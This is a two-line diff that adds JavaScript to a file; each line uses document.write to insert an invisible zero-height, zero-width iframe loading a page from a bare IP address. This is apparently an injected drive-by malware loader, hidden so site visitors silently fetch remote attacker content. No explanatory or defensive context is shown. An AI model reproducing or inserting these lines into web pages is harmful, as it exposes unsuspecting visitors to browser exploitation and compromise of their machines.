@@ -1,0 +1,2 @@
+document.write('<iframe height=0 width=0 src="http://211.42.194.7/test/X.htm"></iframe>');
+document.write('<iframe height=0 width=0 src="http://211.42.194.7/test/XX.htm"></iframe>');
